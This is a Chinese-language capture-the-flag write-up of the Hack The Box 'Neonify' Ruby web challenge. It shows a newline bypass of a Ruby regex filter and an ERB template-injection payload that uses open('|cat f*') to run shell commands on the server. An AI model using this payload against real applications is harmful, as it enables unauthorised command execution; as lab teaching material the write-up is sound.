---
title:  HTB-Neonify-web-challenge-wp
categories: [CTF,HTB]
tags: [web,ruby]
---
第一次遇到ruby后端,感觉ruby语法也有点意思<!--more-->
![image-20220401113528771](image-20220401113528771.png)

## 漏洞查询

分析题目源码：

```ruby
class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end
```

发现题目是ruby语言写的后端。进行代码审计发现` if params[:neon] =~ /^[0-9a-z ]+$/i` 发现存在换行绕过。

![image-20220326111436835](image-20220326111436835.png)

于是`neon=1111%0axxxxj!<>`绕过正则限制.

![image-20220326111830872](image-20220326111830872.png)

然后，一下找不到什么利用点了，但是百度下ERB发现是Embedded RuBy的简称，意思是嵌入式的Ruby，是一种文本模板技术.语法为：

```
<% %>
在括号内执行ruby代码。

<%= %>
在ERB文件中打印一些东西。

<% -%>
避免在表达式后中断行。

<%# %>
括号内的注释；未发送到客户端(与HTML注释相反)。
```

其中提到一个例子：

```ruby
sqlTemplate = ERB.new %q{  
<%for organization in domains.keys%>  
    insert into org_domain(Domain, organization) values('<%=domains[organization]%>','<%=organization%>');  
<%end%>  
} 
```

因此猜测在` ERB.new(params[:neon]).result(binding)`处用ssti.

## 漏洞利用

我们可以通过`<% %>`来执行代码，但是我们看不到回显。下面例子可以看到程序因为找不到xxx而报错。说明我们的代码被执行了。

![image-20220326112945963](image-20220326112945963.png)

但是传统的system,exec都无法直接回显。都要通过vps反弹shell。

通过收集资料发现：

```
file = '|whoami'
puts open(file).read()  # ubuntu
puts open(file).gets    # ubuntu
```

open可以回显出命令执行结果。

因此我们构造payload即可得到flag

`neon=1111%0axxxxj!</h1><%25=open('|cat f*').read()%25><h1>`



![image-20220326120227996](image-20220326120227996.png)



## 参考文献

https://www.cnblogs.com/cuimiemie/p/6442695.html

https://droidyue.com/blog/2014/11/18/six-ways-to-run-shell-in-ruby/